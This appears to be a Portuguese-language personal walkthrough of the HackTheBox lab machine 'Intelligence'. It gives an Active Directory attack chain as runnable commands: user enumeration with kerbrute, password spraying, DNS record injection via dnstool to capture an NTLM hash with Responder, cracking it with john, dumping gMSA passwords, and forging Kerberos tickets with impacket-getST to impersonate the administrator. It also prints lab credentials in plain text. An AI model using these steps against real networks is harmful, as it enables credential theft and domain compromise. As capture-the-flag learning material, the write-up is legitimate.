Intelligence
========================


## Enumeration

```
sudo nmap -sS -T4 -Pn -A 10.10.10.248
```
    
 
Até então nada de versão interessante para procurarmos exploits

Fomos prourar algo interessante na web. Encontramos dois pdfs que fizemos o download e executampos o seguintes comandos para extração de informações (metadados):

    pdfinfo 2020-12-15-upload.pdf
    
    pdfinfo 2020-01-01-upload.pdf
    
  ![qownnotes-media-aHLlUI](../../../media/qownnotes-media-aHLlUI.png)


### enumerando por meio do LDAP:

    nmap -n -sV --script "ldap* and not brute" 10.10.10.248
    
    
  Utilizando o kerbrute (https://github.com/ropnop/kerbrute) verifiquei que os usuários identificados nos PDFs são válidos no AD:
  
      sudo ./kerbrute_linux_amd64 userenum -d intelligence.htb --dc intelligence.htb /usr/share/
      wordlists/rockyou.txt

![qownnotes-media-oVhUkv](../../../media/qownnotes-media-oVhUkv.png)

Tentativa de smb null session:

    smbmap -H 10.10.10.248
    
Enumeração recursiva:

    smbmap -H 10.10.10.248 -R
    
rpcclient test:

    rpcclient -c lookupnames jose.williams -I 10.10.10.248 -N 
    
 Nada relevante. rpcenum:
 
     impacket-rpcdump @10.10.10.248
     
  Retornando ao primeiro passo pra conseguir  enumerar usuários do sistema:
  
      for i in `seq -f "%02.0f" 1 30`; do wget http://intelligence.htb/documents/2020-12-$i-upload.pdf && pdfinfo 2020-12-$i-upload.pdf;done 2>/dev/null  | grep Creator
  
Devo ressaltar que eu fui alterando de mês a mês na unha.

depois eu gerei uma wordlist por meio do site com a ferramenta cewl:

    cewl http://intelligence.htb > passwords.txt
    
    #password spray
    
    for i in `cat passwords.txt`; do kerbrute passwordspray -d intelligence.htb --dc intelligence.htb usernames.txt $i; done
 
 Tentativa de enumerar via RPCCLIENT sem a utilização de credencial
 
   
    for i in `cat usernames.txt`; do rpcclient -N -U $i intelligence.htb;done
    
Tentativa de enumerar via rpcclient, no entanto qualquer coisa a ser executada com isto não funciona (ACCESS_DENIED)
    
    rpcclient -N -U '' 10.10.10.248
    
    enum4linux -a 10.10.10.248
    
Voltamos nos  PDFs para olhar alguma coias a mais lá. Achamos uma credencial sem ser trocada por meio do arquivo de 
20-06-04-upload.pdf
com a senha:

NewIntelligenceCorpUser9876


Então, iniciamos o trabalho de enumeração das coisas já com credencial:

    enum4linux -u intelligence.htb/Tiffany.Molina -p NewIntelligenceCorpUser9876 -a 10.10.10.248
    
    nmap -p 445,139 --script smb-os-discovery.nse intelligence.htb
    nmap -p 445,139 --script smb-system-info.nse intelligence.htb
    nbtscan intelligence.htb
    nbtscan 10.10.10.248
    # Null session test
    smbclient -I 10.10.10.248 -L ACTIVE -N -U ""
    
Depois de tert obtido as credenciais, continuamos a enumeração via LDAP.

enumerating users

ldapsearch -x -h 10.10.248 -D "Tiffany.Molina@intelligence.htb" -W -b "cn=users,dc=intelligence,dc=htb"
    
Command options explained:

-x use simple authentication (as opposed to SASL)
-h your AD server
-D the DN to bind to the directory. In other words, the user you are authenticating with.
-W Prompt for the password. The password should match what is in your directory for the the binddn (-D). Mutually exclusive from -w.
-b The starting point for the search

Tentativa de enumeração de grupos do AD;

    net ads group -S 10.10.10.248 -U Tiffany.Molina -w intelligence.htb
   (no success)
   
    ldapsearch -x -h 10.10.10.248 -D "Tiffany.Molina@intelligence.htb" -W -b "dc=intelligence,dc=htb" "(objectclass=group)"
    (success)

    ldapsearch -x -h 10.10.10.248 -D "Tiffany.Molina@intelligence.htb" -W -b "memberOf=cn='Remote Desktop Users',ou='Remote Desktop Users',dc=intelligence,dc=htb" "(objectcategory=user)"


## Exploitation

Credenciais;
    Tiffany.Molina
NewIntelligenceCorpUser9876

Pŕóximo passo aqui é o seguinte... Descobrimos que existe um script que envias as credenciais para checagem de servidores web... Tudo o que precisamos fazer é um redirecionamento ed DNS por meio do LDAP. Visto que o protocolo LDAP pode escrever nos registeros de DNS do servidor, é por ele que vamos explorar a vulnerabilidade.


Primeiro só visualizei os registros que já tinham no servidor;


    ldapsearch -x -h 10.10.10.248 -D "Tiffany.Molina@intelligence.htb" -W -b "CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb"
    
 Para criação de um novo registro de DNS no servidor, será necessário criarmos um arquivo LDIF:
 
 
 dn: DC=RootDNSServers,CN=MicrosoftDNS,DC=DomainDnsZones,
 DC=intelligence,DC=htb
 objectClass: top
 objectClass: dnsNode
 arecord: 10.10.14.8
 
 
 Aqui vale ressaltar que quando fui fazer o registro de DNS, notei que ocampo recordDns estava em base 64. Quando decodado, ainda sim não aparecia um IP address, as sim caracteres estranhos. Sendo assim, com uma pesquisa a respeito do assunto, notei que tem um formato específico essa informação conforme dcocumentação da microsoft que pode ser encontrada em:
 
 https://msdn.microsoft.com/en-us/library/ee898781.aspx

Com as orientações desse post aqui:
 
 https://perlmonks.org/index.pl?node_id=1152619
 
 copiei o script deste post e fiz o decode:
 
 ![qownnotes-media-MTKZsl](../../../media/qownnotes-media-MTKZsl.png)

    
#!/usr/bin/perl
    
    # Prints data from "dnsRecord" AD attribute
    
    # adapted from script by natxo, VinsWorldcom and choroba
    # found on http://perlmonks.org/index.pl?node_id=1152619
    # not much tested
    
    use Socket;
    my $out = $ARGV[0];
    
    print (unpack "H*", $out);
    print "\n";
    print substr ((unpack "H*", $out), -8);
    print "\n";
    print inet_ntoa(substr $out, -4);
 
Detalhe que tem uma ferramenta que me auxiliou com relação a colocar um novo registro de DNS na máquina que pode ser obtida no seguinte git:

    https://github.com/dirkjanm/krbrelayx.git

É importante mencionar que essa ferramenta depende do impacket, que já está instalado na máquina e, nesse caso bastou eu executar o seguinte comando para inserir o registro lá:

    python dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a add -r webfakedomain.intelligence.htb -d 10.10.14.2 10.10.10.248
 
Feito isso, bastou subir o responder com o seguinte comando para obter a hash do Ted.Graves:


    sudo responder -I tun0 -A

copiei e colei o hash obtido no responder e quebrei com o john

    john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

### Enumerar o domínio

    python3.9 bloodhound.py -ns 10.10.10.248 -d intelligence.htb -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' -dc intelligence.htb -c all

### Enumerar shares

```
crackmapexec smb 10.10.10.248 -u Ted.Graves -p Mr.Teddy --shares
```
    
```
smbclient -L //10.10.10.248/ -U intelligence.htb/Ted.Graves
```
    
### Obter hashes de senha

#### Account services

(Esse foi o que funcionou)
    


```
python3.10 gMSADumper/gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb
```


```
impacket-GetUserSPNs -request -dc-ip 10.10.10.248 intelligence.htb/Ted.Graves:Mr.Teddy
```

![qownnotes-media-QReoeZ](../../../media/qownnotes-media-QReoeZ.png)

```
impacket-getST -impersonate administrator -spn www/dc.intelligence.htb -hashes :<nt_hash_de_senha>  intelligence.htb/svc_int 
```

```
impacket-getST 'home.lab/svc_iis:P@ssw0rd10' -dc-ip 192.168.175.200 -spn 'MYSQL/dc01.home.lab' -impersonate administrator -altservice LDAP
```